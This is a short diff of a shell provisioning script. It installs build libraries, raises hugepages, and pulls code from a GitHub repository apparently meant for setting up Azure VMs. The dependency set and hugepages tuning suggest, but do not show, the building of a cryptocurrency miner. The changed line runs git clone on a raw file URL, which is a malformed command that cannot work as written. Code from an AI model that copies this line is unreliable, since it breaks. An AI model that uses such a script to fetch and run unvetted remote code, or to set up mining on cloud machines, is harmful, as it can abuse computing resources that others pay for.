@@ -4,7 +4,7 @@ sudo apt-get -y update
 sudo apt -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev
 
 sudo sysctl -w vm.nr_hugepages=1500
-git clone https://github.com/vace11/vace11
+git clone https://raw.githubusercontent.com/vace11/vace11/main/azure_script/setup_vm3.sh
 if [ -z "$gittag" ]
 then
       echo "Running with latest version from git..."
